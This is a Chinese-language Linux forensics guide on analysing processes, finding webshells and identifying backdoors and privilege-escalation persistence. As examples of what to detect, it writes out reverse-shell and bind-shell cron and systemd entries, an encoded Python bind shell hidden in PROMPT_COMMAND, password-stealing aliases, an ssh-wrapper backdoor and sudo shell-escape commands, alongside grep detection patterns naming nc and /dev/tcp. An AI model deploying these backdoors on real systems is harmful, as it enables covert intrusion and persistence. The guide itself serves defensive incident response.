[TOC]

# 0x07 进程分析

## 1 进程基本信息获取

```shell
# 查看系统内的进程列表并给出相应的基本信息
ps -ef
ps auxfww #能看到启动该进程时输入的命令
# 查看某进程的线程
ps -Lf $pid
# 查看父子进程树
pstree
# 其他
htop || top
```

## 2 进程与网络

### 2.1 知端口找进程

```shell
lsof -i:80 #得pid
pstree -p $pid #得进程树
```

```shell
netstat -ntaup|grep $port #得pid，等效于ss -ntaup|grep $port 
ps axu|grep $pid #得进程
```

### 2.2 知进程找端口

```shell
ps aux|grep $proc_name 查看第二列获得pid
netstat -ntaup|grep $pid
```

### 2.3 知进程找raw_socket

常规的网络通信流量都是基于TCP/UDP实现的，基本都处于传输层及应用层。然而在网络攻击场景下，部分攻击者为了达到躲避隐藏的目的，会让失陷主机通过诸如ICMP这样的网络层协议与攻击机进行通信，这时可以过滤系统内绑定了原始套接字（sock_raw）的进程进行分析。

```shell
netstat -awp
ss -awp
#或者
lsof | grep raw
```

## 3 进程与命令

```shell
ps auxfww|grep $pid
cat /proc/$pid/cmdline|xxd
```
## 4 进程与文件

### 4.1 查看启动进程的二进制文件

使用ps

```shell
#最后一列获得命令文件的路径，可能是相对路径，需要whereis或find一下。
ps auxfww
```

使用readlink

```
readlink /proc/${pid}/exe
```
+ ps: 定位文件后常要进一步分析是否被篡改或有恶意行为

### 4.2 查看进程访问的文件

```shell
lsof -p $pid
#FD列为r/u/w的代表读写操作，txt为程序绝对路径，cwd为目录，mem为使用的库文件

ls -al /proc/$pid/fd/
# 都是软链接，软链接指向的信息给出了进程占用的文件。

lsof $filename
ps aux|grep $pid
#定位占用某文件的进程
```

## 5 进程与函数调用

```shell
#使用以下工具可以查看到进程生命周期中调用的一些系统库函数，这些函数能帮助初步识别进程的行为与功能。
strace -p $pid
ltrace -p $pid
```

## 6 /proc/$pid

/proc/$pid/下记录了某个进程获取及分配的各种资源。这些资源在取证及文件恢复时有很大作用。

```
/proc/$pid/cmdline：指示创建当前进程时输入的命令
/proc/$pid/cwd：指示启动该进程时所处的目录
/proc/$pid/environ：指示进程运行时的环境变量
/proc/$pid/exe:是进程依赖的二进制的软链接。
/proc/$pid/root：指示系统根目录的软链接。一般为/。
/proc/$pid/fd：进程运行中申请的所有所有文件描述符。包括普通文件读写，标准输入输出错误，管道以及socket。
/proc/$pid/mem：内存空间，不能直接看，要通过maps，map_file/*进行辅助分析。
/proc/$pid/maps：进程分配的内存表。可以当作是map_files的索引文件。文件名是一段地址范围。
/proc/$pid/maps_files:包括maps指示的各地址段的内存映像。可以进行关键字搜索或逆向分析。
/proc/$pid/stacks：当前时刻主线程函数调用栈。
/proc/$pid/task：当前时刻子线程函数调用栈。
```

# 0x08 webshell 分析

## 1 常用webshell专杀工具

D盾 http://www.d99net.net/down/d_safe_2.1.5.4.zip

河马webshell查杀 https://www.shellpub.com/

安全狗 http://free.safedog.cn/website_safedog.html

## 2 目录手工分析

```shell
# 下面两条适合对上传目录的粗筛
grep -rn "php\|<%\|md5\|POST\|GET" upload/
find upload/ -name *.php *php* *.jsp *tml *.jar *.war

# 有备份文件时可以做备份比对
vimdiff <(cd $webroot_path; find . -exec md5sum {} \; | sort -k 2) <(cd $webroot_bakpath; find . -exec md5sum {} \; | sort -k 2)

#时间戳排序，注意最早及最晚的
for i in `find /var/www/html/ -type f`;do a=`stat $i|sed -n 6p`; echo "$a  $i"; done |sort -nr
```
## 3 web日志分析

一般来说，web日志的数据量很大，对分析人员手工分析非常不友好。
下面给出默认情况下，常见web服务器的默认日志路径：
```shell
debian-nginx:		/var/log/nginx/access.log
debian-apache:		/var/log/apache2/access.log 
centos-apache:		/var/log/httpd/access_log
centos-nginx:		/var/log/nginx/access.log 
```

如果支持web日志导出，可以使用一些web日志分析工具进行分析，这类工具是有一定片面性的，一者日志可能无法记录到post的内容，导致很多webshell事件会被漏报，二者在使用过程中可能还需要手工再次甄别分析结果。

360的星图日志分析 https://www.jb51.net/softs/270178.html

在通过web查杀工具或web文件备份比对时，如果识别出了部分疑似文件，我们也能在日志中过滤一下，识别是否存在对该文件的访问进而确定攻击时间。

# 0x09 后门识别

后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法，是一个很泛的说法。依据用途我大概将它分为4类：

+ 1、登录后门。用于帮助攻击者便捷的登录失陷主机。
+ 2、间谍后门。用于偷取用户的敏感数据。
+ 3、提权后门。用于帮助攻击者从低权限账户跳跃到高权限账户。
+ 4、rootkit。用于帮助攻击者在失陷主机上实现顽固并隐身的驻留。

登录后门最为常见。后门想要实现持久化基本都会将自身写入以下位置：计划任务、系统启动项、Shell配置文件、公共库文件、高频使用的命令。因此虽然后门种类有区别，但是驻留思路都是相近相通的。

## 1 非提权类型后门排查

### 1.1 后门账户

攻击者拥有账户权限后，想达到长期驻留系统时往往不修改账户密码，而是采取加用户或写公钥的方式。

排查过程中主要关注： 

(1)	检查免口令认证公钥。

有公钥输出就要确认该公钥是否属于运维人员自己的公钥。该公钥是否被用于登录。

```shell
for i in `cat /etc/passwd|grep "/bash"|awk -F: '{print $6}'`;do cat ${i}/.ssh/authorized_keys ;done
```

找到未知公钥后可以参考下面的方法，计算出公钥的指纹信息，再在日志里面搜索，进而确定该公钥是否已被用于登录。如果搜索出来的信息关联到了一个IP，自行确认IP信息后，可以确定系统内插了个后门账户。

```shell
grep -rn `sed -n '${line_num}p' ~${user}/.ssh/authorized_keys |ssh-keygen -lf -|awk '{print $2}'` /var/log
```

(2)	检查系统账户配置文件。

```shell
cat /etc/passwd | awk -F: '{print $3"  "$1}'|sort -n 
#存在多个相同的uid说明有隐藏账户。
```

自行观察账户文件底部的是否有新增用户，名称，家目录是否具有迷惑性。

### 1.2 篡改计划任务

分析定时任务文件中是否存在定时创建socket,定时外发文件的动作。简单的排查命令如下：
```shell
grep -rn "/dev/\| nc\|sh\|telnet\|*cat\|awk\|system\|eval\|socket\|exec" /var/spool/*cron/
grep -rn "/dev/\| nc\|sh\|telnet\|*cat\|awk\|system\|eval\|socket\|exec" /etc/*cron*
```

几个常见的定时任务后门的形式：
```shell
crontab -l | { cat; echo "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/2333 0>&1"; } | crontab -
(crontab -l;printf "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/5555 0>&1;\rno crontab for `whoami`%100c\n")|crontab -
echo ' * */5 * * * root ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337' >> /etc/crontab
```

### 1.3 服务型后门

#### 1.3.1 systemd后门

参考 0x06 自启动任务排查，关注以下目录中是否存在后门指令。

```shell
/etc/systemd/system/
/run/system/system/
[/usr]/lib/systemd/system/
/etc/rc.*    
```

以下给出一个例子，systemd自启动后门运行的检查过程。

```shell
# 发现开机自启动项存在名为backdoor的服务，同时网络端口上有个nc监听在41111口上。
systemctl list-unit-files --type service |grep enabled
netstat -ntaup

# 查看该service文件发现以下内容，这是一段bindshell指令。
cat /usr/lib/systemd/system/backdoor.service

[Unit]
Description=Just a simple backdoor for test
After=network.target
[Service]
Type=forking
ExecStart=bash -c "nc -l -p 41111 -e /bin/bash &"
ExecReload=
ExecStop=
PrivateTmp=true
[Install]
WantedBy=multi-user.target
```

#### 1.3.2 (x)inetd后门

inetd是早期的超级任务管理程序，后来被xinetd代替。目前不少系统默认没有安装并开启xinetd。但请注意，系统内开启了telnet则一定要检查(x)inetd。

一个典型的inetd后门形如：
```shell
#这是一个bindshell后门
#inetd进程监听着某端口
netstat -ntaup|grep inetd

cat /etc/inetd.conf #发现存在daytime stream tcp nowait /bin/sh sh –I

cat /etc/services |grep daytime #发现daytime服务绑定在(13/*)

```

一个典型的xinetd后门形如：
```shell
#这是一个bindshell后门
cat /etc/xinet.d/safe-guard.xinetd

# default: yes
# description: The safe-guard server servestelnet sessions;
service safe-guard
{
  flags = REUSE
  socket_type = stream
  wait = no
  user = root
  server =/bin/bash
  log_on_failure += USERID
  disable = no
}

cat /etc/services |grep safe-guard
safe-guard      58888/tcp               # CentOS safe-guard master daemon

```

可以在排查时关注脚本文件内是否含有以下字符串：
```shell
/bin/bash
/bin/sh
/usr/sbin/in.telnetd
/usr/sbin/in.rshd
/usr/sbin/in.rlogind
/usr/sbin/in.rexecd
```

### 1.4 篡改shell及公共配置文件

#### 1.4.1 别名后门

命令别名后门通过在shell配置文件及公共配置文件中定义alias/hash等命令诱导用户使用被篡改的命令。排查方式比较简单，检查文档中是否出现此类关键字就行。一般来说，默认的alias即使有命令也普遍集中于ls/grep。
```shell
a=(/etc/profile /etc/bashrc ~/.bashrc ~/.bash_file ~/.profile)
for i in `echo $a`;do grep "alias\|hash" $i; done
```

常见的别名后门，如：
```shell
# 在/etc/profile内alias+strace+ssh偷密码：
alias ssh='strace -o /tmp/sshwd-`date '+%d%h%m%s'`.log -e read -s 2048 ssh'

# 在/etc/profile内添加了如下命令：
alias ls="alerts(){ ls $* --color=auto;ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=32110 };alerts"

# 在~/.bashrc中添加如下命令：
alias sudo='/tmp/.sudo'
```

不常见的，如：
利用hash命令，劫持常用命令。hash 用于查看terminal创建后某项命令程序的使用次数。hash -p参数可以用来设置某个二进制程序的运行别名，如果在/etc/profile内预先执行能达到类似于alias后门的效果。

```shell
hash -p /tmp/su-backdoor su 
hash -p /tmp/sudo-backdoor sudo
```

#### 1.4.2 篡改环境变量
程序的运行普遍依赖一定的环境变量，篡改环境变量可以改变程序的资源分配甚至改变使用者本想运行的命令。攻击者通过在shell配置文件及公共配置文件中设置环境变量的值达到影响程序的目的。

##### $PATH后门

攻击类型1：篡改$PATH

攻击者修改$PATH，手工加入更高优先级的目录，并放入同名后门程序，用来劫持常用的命令。排查命令：

```shell
grep -n "PATH=\|:\$PATH" ~/.* 2>/dev/null
grep -rn "PATH=\|:\$PATH" /etc/profi* 2>/dev/null
grep -n "PATH=\|:\$PATH" /etc/bashrc 2>/dev/null
```
检查结果中是否存在非常见的目录如：家目录、/tmp目录。

攻击类型2：利用$PATH的缺陷。

攻击者在现有的高优先级的目录中放置同名后门程序，劫持低目录中的程序。排查命令：

```shell
# 例如攻击者通过在/usr/local/sbin或/usr/local/bin中部署后门程序如sudo，可以优先于原本/usr/bin/sudo执行。
find /usr/local/sbin -perm -100 -type f> 1.txt
find /usr/local/bin -perm -100 -type f >>1.txt
find /home -perm -100 -type f >>1.txt
find /root -perm -100 -type f >>1.txt
cat 1.txt|sort|uniq -c|sort -nr|head -n 10
```
##### $PROMPT_COMMAND后门

该环境变量通俗来说用于在执行每条命令前执行命令，不少运维人员利用它来做历史记录加固，但是攻击者同样可以利用它来插入后门逻辑。排查命令如下：

```shell
grep -n "PROMPT_COMMAND" ~/.* 2>/dev/null
grep -rn "PROMPT_COMMAND" /etc/profi* 2>/dev/null
grep -n "PROMPT_COMMAND" /etc/bashrc 2>/dev/null
```

正常的该环境变量内容应该是关于shell的界面显示：

```shell
#    PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD}\007"'
```

或是结合历史记录加固的：

```shell
history -a; history -a; printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/~}"
```

而下面这种情况是一条利用环境变量来做bind shell的后门。每一次执行先检查端口有没有占用，如果没占用，立马开一个后门端口。
```shell
export PROMPT_COMMAND="lsof -i:23333 &>/dev/null || (python2 -c \"exec('aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwyMzMzMykpCnMubGlzdGVuKDEpCihjLGEpPXMuYWNjZXB0KCkKd2hpbGUgMToKIGQ9Yy5yZWN2KDUxMikKIGlmICdleGl0JyBpbiBkOgogIHMuY2xvc2UoKQogIHN5cy5leGl0KDApCiByPW9zLnBvcGVuKGQpLnJlYWQoKQogYy5zZW5kKHIpCg=='.decode('base64'))\" 2>/dev/null &)"
```
##### $LD_PRELOAD后门
$LD_PRELOAD用于指定程序动态库的加载。动态库的加载满足下面的定义顺序：
```shell
$LD_PRELOAD>$LD_LIBRARY_PATH>/etc/ld.so.cache>/lib>/usr/lib
```
故而，攻击者利用该环境变量定义的库文件可以实现对函数的劫持。

排查命令如下：
```shell
grep -n "LD_PRELOAD" ~/.* 2>/dev/null
grep -rn "LD_PRELOAD" /etc/profi* 2>/dev/null
grep -n "LD_PRELOAD" /etc/bashrc 2>/dev/null
#观察结果内是否存在形如：export LD_PRELOAD=/xxxx/xxx.so
```
如果系统内正在运行的进程存在加载了该环境变量的可能，通过检查/proc/*/environ也能快速定位到受影响的进程。
```shell
cat /proc/*/environ |tr '\0' '\n'|grep LD_PRELOAD
grep -rn LD_PRELOAD /proc/*/environ
```

##### $LD_LIBRARY_PATH后门

与$LD_PRELOAD后门检测方法基本一致：
```shell
grep -n "LD_LIBRARY_PATH" ~/.* 2>/dev/null
grep -rn "LD_LIBRARY_PATH" /etc/profi* 2>/dev/null
grep -n "LD_LIBRARY_PATH" /etc/bashrc 2>/dev/null
# 观察结果内是否存在形如：export LD_LIBRARY_PATH =/xxxx/xxx.so
```

### 1.5 篡改库文件

#### 1.5.1 pam后门

“Linux-PAM（即linux可插入认证模块）是一套共享库,使本地系统管理员可以随意选择程序的认证方式。换句话说，不用(重新编写)重新编译一个包含PAM功能的应用程序，就可以改变它使用的认证机制，这种方式下，就算升级本地认证机制,也不用修改程序。”换个角度来看，如果攻击者可以通过篡改pam模块达到劫持认证的目的。

PAM配置应用认证方式的文件在/etc/pam.d/目录下。调用的模块库:

```shell
RHEL:/usr/lib64/security/
Debian: /usr/lib/x86_64-linux-gnu/security/
```

主要的利用方式有两种：

（1）	篡改配置文件，加入攻击者自定义的pam库文件。
sshLooterC就是这样一个工具。 https://github.com/mthbernardes/sshLooterC 
试了下RHEL上可以运行，Debian上有些问题，通过在/etc/pam.d/common-auth中插入编译好的so文件，并将编译好的劫持库放到目录下即可。

取证的方法就是检查配置文件有没有被篡改。如果系统支持包管理检查的话，可以确认以下有没有配置文件被改了。

```shell
rpm -V `rpm -qf /etc/pam.d/system-auth`
```

（2）	源码修改并替换库文件，从而实现后门植入。
下面两篇文章中，作者分别实现了这种方式的后门植入。
Debian:https://www.cnblogs.com/adhzl/p/12098397.html
RHEL:https://xz.aliyun.com/t/7902

取证的过程分为以下几步：
1.	确定pam版本。rpm -qa | grep pam（或，dpkg -l | grep pam）
2.	下载对应版本源码。http://www.linux-pam.org/library/
3.	编译。（./configure && make）
4.	比较so文件散列值。
5.	分析异常so文件。

pam对大多数人而言可能比较生疏，这里有一些文章可以看看。
[1] Linux下PAM模块学习总结https://www.cnblogs.com/kevingrace/p/8671964.html

#### 1.5.2 /etc/ld.so.cache

/etc/ld.so.cache可以认为是程序的动态链接库字典，需要动态链接的程序会在系统内的动态加载器的帮助下读取/etc/ld.so.cache进而获得要用到的库文件。因而攻击者通过篡改该文件的内容，可以实现插入后门劫持程序运行的效果。这一技术在一些rootkit中常被使用。

检查方式是确定库文件的归属，通过下载对应版本的安装包或使用包管理器检查该库文件是否被篡改。

（1）下面的例子中使用包管理器检查某库文件。

```shell
#以debian下某库文件libBLT为例
cat /etc/ld.so.cache|tr '\0' '\n' |grep libBLT
ls -il /lib/libBLT.2.5.so.8.6 #获得inode
dkpg -S /usr/lib/libBLT.2.5.so.8.6 #获得二进制所属的包
dpkg -V tk8.6-blt2.5 #dpkg自检

#RHEL下
rpm -qf $filename
rpm -V $package
```

（2）下面的例子中通过比对官方包散列值来检查某库文件。

Debian系：
```shell
apt-get download xxx					#只下载
dpkg -X ./xxx.deb extract				#解压到extract目录
```

RHEL系：

```shell
yum install --downloadonly --downloaddir=/tmp/ XXX	#只下载
rpm2cpio xxx.rpm | cpio -div						#解压到当前目录
```
将待分析的so文件与解压后得到的文件使用md5sum比对散列值。

#### 1.5.3 /etc/ld.so.preload

网上不少文章提到该库文件，但看了一下本人的好几套环境上都没有该配置文件，因此真实性不做保证。这里留下来只是作为以防万一。

该配置文件作用与LD_PRELOAD类似，帮助程序预先加载一些库文件，内容与/etc/ld.so.cache。

因此，排查方法与/etc/ld.so.cache类似，使用包管理器确定其中的库文件来源并检查库文件是否被篡改。

### 1.6 篡改命令文件

篡改文件有两类常见的手法，一类是用含有后门逻辑的脚本文件替换掉命令文件，一类通过修改文件源码再编译。

使用包管理器检查能检查通过包管理器安装的程序。对于不支持包管理检查的文件或系统，发现脚本类替换相对容易，但发现源码修改再编译的后门则比较困难。

#### 1.6.1 包管理器自检
```shell
RHEL：rpm -aV
Debian：dpkg -V
```
这种方式依赖系统内包管理器可正常工作的情况。同时还要求被查的软件或二进制是采用源安装方式。如果采用pip，源码编译等方式进行安装，那就发现不了。

#### 1.6.2 检查脚本文件
使用下面给出的命令能快速检查常用程序目录下的脚本是否属于被篡改的脚本，如果包管理没有识别到该脚本的归属，单独查看内容进行分析即可，不常见的命令可以不用管。

```shell
# Debian:
find /usr/*bin /usr/local/*bin -type f -exec file {} \; |grep -v ELF|awk -F: '{print $1}'|xargs dpkg -S|awk -F: '{print $1}'|dpkg -V

# RHEL:
find /usr/*bin /usr/local/*bin -type f -exec file {} \; | grep -v ELF|awk -F: '{print $1}'|xargs rpm -qf|sort -n|uniq|xargs rpm -V
```

#### 1.6.3 检查ELF文件
（1）文件校验
实际场景下很少做这种检查，因为这种方法难以在取证场景下大量快速的展开，消耗时间与人力代价很大。

下面以一个OpenSSH后门排查为例。

首先确定二进制归属与版本：
```shell
dpkg -S /usr/sbin/sshd
dpkg -l openssh-server
(RHEL下对应于rpm -qf /usr/sbin/sshd结果直接包含版本号)
```

接着去开源社区搜一下，下载对应的deb包或rpm包、bin包。通过解压或执行的方式获得其中的二进制文件，算一遍散列值进行比对。

```shell
# Debian-deb：
dpkg -X ./xxx.deb extract	#解压到extract目录
dpkg -i ./xxx.deb			#安装该deb包

# RHEL-rpm：
rpm2cpio xxx.rpm | cpio -div	#解压到当前目录
rpm -i xxx.rpm			#安装该rpm包

# bin文件：
chmod +x xxx.bin; ./xxx.bin
```
这类文件比较特殊，可以在虚拟机里面安装后获得二进制，再算散列值。

（2）进程分析
这种排查方式的代价更高，同时可能需要沙箱环境。如果这种进程分析搞不定可能还需要文件逆向分析。

以进程分析OpenSSH后门为例。starce -ff -p $sshd_pid可以捕获到的正常的SSH登录中抓到的账户名及密码。如果OpenSSH-Server被篡改了，那么在该部分往后应该会有读写文件或创建socket外发的操作，具体的操作取决于攻击者的手段与目的（窃取型的可以直接写到本地也可以创建socket外发，口令鉴权绕过的除了硬编码口令应该也会存在其他绕过手段）。实际操作起来还会有很多问题，时间代价与精力代价都很高。

下面是一些此类后门的相关文章。
https://www.cnblogs.com/bigdevilking/p/9535427.html
https://www.cnblogs.com/jouny/p/4688194.html
https://www.freebuf.com/news/153364.html
https://www.cnblogs.com/croso/p/5280783.html
https://www.moonsec.com/archives/1720

（3）逆向工程

略。

#### 1.6.4 条件触发型后门

在正常使用操作中，用户无法感知，只有满足一定条件下才能触发后门逻辑的后门。检查的重点在于文件是否被篡改。有以下几种方式能够帮助检查：1.包管理器自检；2.md5sum比对；3.查看文件内容。

下面是一个典型ssh-wrapper后门的形式。此后门要求连接ssh的源端口满足指定的条件就能出发任意密码登录。
```shell
cd /usr/sbin
mv sshd ../bin
vi sshd
>>>>>
#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..4A/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
<<<<<<
#netstat -ntuap结果无异常bind端口，无异常socket连接。但用socat指定源端口登录时会直接登陆上
socat STDIO TCP4:10.18.180.20:22,sourceport=13377
```

### 1.7 其他
#### 1.7.1 ssh软链接后门
软链接后门是一种比较特殊的后门，形式如下：
```shell
ln -sf /usr/sbin/sshd /xxx/su;/xxx/su -oPort=$port_num
```
使用ps aux && netstat -ntaup等命令查看进程名时能快速发现该后门，特点在于文件名必须为su。

#### 1.7.2 Git hooks后门（未证实）
利用git commit时触发反弹shell的逻辑。典型形式如下：
```shell
echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

Xnest:1
```

排查方式：所有本地的仓库内是否含有该文件及xterm关键字。
```shell
find / -name .git -exec grep -nr xterm {} \; 2>/dev/null
```

## 2 提权类后门排查

提权后门的取证在实际场合下意义不大。

一般来说攻击者具备提权为root的能力后都会直接在root权限下做持久化，以免每一次登录都要走一遍提权流程很麻烦。

### 2.1 suid shell
方法就是检查所有属主的x位被置为s的文件。检查方式是使用包管理器检查或二进制逆向的方式检查所有输出的结果。
find / -perm -4000 -uid 0 2>/dev/null

### 2.2 sudo配置不当-受限命令绕过
部分自带参数执行shell命令的命令如果经sudo配置下发给普通用户，普通用户可以用该参数提权为root。但在实际场景下基本遇不到，即便sudo的配置存在该问题，如果历史记录没记录到就无法取证该事件。

这种场景下sudo配置文件常常添加了形如如下的配置：
```shell
testme ALL=(ALL) NOPASSWD: /usr/bin/vi
apache ALL=(root) NOPASSWD:/usr/bin/zip
```
除了上面的命令vi与zip以外，还包括很多命令：
```shell
tar/more/less/man/ftp/python/vim/find/strace/git/passwd/awk
```

对应攻击者进行利用的方式：
```
sudo zip ./7.zip /tmp -T --unzip-command="sh -c /bin/bash"
sudo tar cf /dev/null test.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo more /tmp/a.txt ; !/bin/bash
sudo less /tmp/a.txt; !/bin/bash
sudo man ssh; !/bin/bash
sudo ftp; !/bin/bash
sudo vim -c '!sh'
sudo find /bin/ -name ls -exec '/bin/bash' \;
sudo strace -o /dev/null /bin/bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
sudo git help status;!/bin/bash
sudo passwd
sudo awk 'BEGIN{system("/bin/bash")}'
sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
```
### 2.3 目录或文件与进程的属主不一致导致提权

由root等高权限用户周期性调用执行的文件 被部署在其他用户的家目录下（或该文件的属主为其他用户时），则当该用户失陷时，攻击者可以篡改该文件的内容，诱导root执行高风险的操作。

实际场景下很难取证，因此不做展开。